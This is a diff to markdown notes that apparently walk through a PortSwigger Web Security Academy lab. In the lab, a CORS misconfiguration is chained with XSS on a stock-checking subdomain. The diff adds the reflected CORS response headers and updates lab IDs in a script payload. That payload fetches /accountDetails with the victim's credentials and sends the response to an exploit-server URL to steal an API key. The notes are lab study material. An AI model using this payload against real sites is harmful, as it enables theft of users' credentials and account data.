@@ -37,7 +37,6 @@ req()
 ```
 Then you can make a request to that another website on behalf of the user
 
-
 ### Errors parsing Origin headers
 Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.
 
@@ -89,11 +88,16 @@ So we need a way of stealing admin's API key.
 - The response to /accountDetails contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
 - Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.0a5a00e503089526801a213200ac0073.web-security-academy.net 
 (Don't forget `http` or `https`. If you specify: `subdomain.0a5a00e503089526801a213200ac0073.web-security-academy.net` you're not gonna get `Access-Control-Allow-Origin` header in response)
+In the response we get:
+```bash
+Access-Control-Allow-Origin: http://subdomain.0a1e0074045c8af080abd07700fb004c.web-security-academy.net
+Access-Control-Allow-Credentials: true
+```
 - Since the origin is reflected in the Access-Control-Allow-Origin header, it confirms that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
 
 After looking through the website's html, a subdomain was found (in the check stock req):
 ```bash
-http://stock.lab-id.web-security-academy.net/?productId=1&storeId=1
+http://stock.labid.web-security-academy.net/?productId=1&storeId=1
 ```
 After playing around with the endpoint we see that the `productID` is vulnerable to XSS.
 e.g. if we send:
@@ -115,7 +119,7 @@ In the browser the response from above creates a `<script>` tab and executes js 
 So we try to make the victim make a request to `/accountDetails`, but we do it via subdomain, because we don't want CORS to stand on our way:
 ```bash
 <script>
-    document.location="http://stock.0a5a00e503089526801a213200ac0073.web-security-academy.net/?productId=4<script>const req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a5a00e503089526801a213200ac0073.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a9000fb03cd95ce8034206201520055.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+    document.location="http://stock.0a1e0074045c8af080abd07700fb004c.web-security-academy.net/?productId=4<script>const req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a1e0074045c8af080abd07700fb004c.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a3f00b104618a5b808bcf90016500e8.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
 
